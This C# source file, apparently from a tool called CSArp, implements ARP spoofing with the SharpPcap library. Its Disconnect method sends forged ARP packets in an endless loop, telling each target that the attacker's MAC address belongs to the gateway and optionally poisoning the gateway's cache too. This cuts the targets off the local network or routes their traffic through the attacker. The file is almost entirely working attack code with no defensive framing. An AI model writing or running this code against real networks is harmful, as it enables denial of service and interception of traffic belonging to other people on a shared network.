using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;
using System.Windows.Forms;
using PacketDotNet;
using SharpPcap;

namespace CSArp
{
    public static class DisconnectReconnect
    {
        private static Dictionary<IPAddress, PhysicalAddress> engagedclientlist;
        private static bool disengageflag = true;
        private static ICaptureDevice capturedevice;
        private static bool RedirectionActive = false;

        public static void Disconnect(ListView view, Dictionary<IPAddress, PhysicalAddress> targetlist, IPAddress gatewayipaddress, PhysicalAddress gatewaymacaddress, string interfacefriendlyname)
        {
            engagedclientlist = new Dictionary<IPAddress, PhysicalAddress>();
            capturedevice = (from devicex in CaptureDeviceList.Instance where ((SharpPcap.WinPcap.WinPcapDevice)devicex).Interface.FriendlyName == interfacefriendlyname select devicex).ToList()[0];
            capturedevice.Open();

            foreach (var target in targetlist)
            {
                ARPPacket ArpPacketForVicSpoof = new ARPPacket(ARPOperation.Request, target.Value, target.Key, capturedevice.MacAddress, gatewayipaddress);
                ARPPacket ArpPacketForGatewaySpoof = new ARPPacket(ARPOperation.Request, gatewaymacaddress, gatewayipaddress, capturedevice.MacAddress, target.Key);
                EthernetPacket EtherPacketForVicSpoof = new EthernetPacket(capturedevice.MacAddress, target.Value, EthernetPacketType.Arp);
                EthernetPacket EtherPacketForGatewaySpoof = new EthernetPacket(capturedevice.MacAddress, gatewaymacaddress, EthernetPacketType.Arp);
                EtherPacketForGatewaySpoof.PayloadPacket = ArpPacketForGatewaySpoof;
                EtherPacketForVicSpoof.PayloadPacket = ArpPacketForVicSpoof;
                new Thread(() =>
                {
                    disengageflag = false;
                    try
                    {
                        while (!disengageflag)
                        {

                            capturedevice.SendPacket(EtherPacketForVicSpoof);
                            if (RedirectionActive)
                            {
                                capturedevice.SendPacket(EtherPacketForGatewaySpoof);
                            }

                        }

                    }
                    catch (PcapException ex)
                    {
                    }
                }).Start();

                engagedclientlist.Add(target.Key, target.Value);
            }





        }




        public static void Reconnect()
        {
            disengageflag = true;
            if (engagedclientlist != null)
                engagedclientlist.Clear();
        }

    }

}
